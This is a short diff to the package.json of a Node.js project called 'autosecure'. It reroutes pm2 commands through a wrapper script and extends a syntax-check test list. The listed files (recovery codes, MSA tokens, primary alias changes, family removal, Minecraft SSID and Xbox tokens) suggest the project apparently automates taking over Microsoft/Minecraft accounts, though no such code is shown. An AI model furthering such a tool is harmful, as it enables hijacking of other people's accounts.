@@ -5,12 +5,14 @@
     "bot": "node --no-deprecation --max-http-header-size=524288 autosecure.js",
     "backend": "node --no-deprecation --max-http-header-size=524288 servers/backendServer.js",
     "frontend": "node --no-deprecation --max-http-header-size=524288 servers/frontendServer.js",
-    "pm2:start": "pm2 start ecosystem.config.js",
-    "pm2:stop": "pm2 stop all",
-    "pm2:restart": "pm2 restart all",
+    "pm2:start": "node scripts/pm2-runner.js start ecosystem.config.js",
+    "pm2:stop": "node scripts/pm2-runner.js stop all",
+    "pm2:restart": "node scripts/pm2-runner.js restart all",
+    "pm2:status": "node scripts/pm2-runner.js status",
+    "pm2:logs": "node scripts/pm2-runner.js logs",
     "ui:dev": "npm --prefix frontend run dev",
     "ui:build": "npm --prefix frontend run build",
-    "test": "node -c server.js servers/backendServer.js servers/frontendServer.js autosecure/utils/secure/makePrimary.js autosecure/utils/sections/aliasses.js autosecure/utils/secure/recodesecure.js autosecure/utils/process/helpers.js"
+    "test": "node -c server.js run_all.js configLoader.js autosecure/utils/family/getPuid.js autosecure/utils/family/leaveFamily.js autosecure/utils/minecraft/profile.js autosecure/utils/minecraft/ssid.js autosecure/utils/minecraft/xbl.js autosecure/utils/minecraft/newxbl.js autosecure/utils/sections/aliasses.js autosecure/utils/secure/recodesecure.js autosecure/utils/secure/recoveryCode.js autosecure/utils/secure/recoveryCodefix.js autosecure/utils/secure/getmsatoken.js autosecure/utils/secure/securityInformation.js autosecure/utils/process/helpers.js autosecure/utils/process/globalAxiosProxy.js"
   },
   "dependencies": {
     "@bufbuild/protobuf": "^2.8.0",
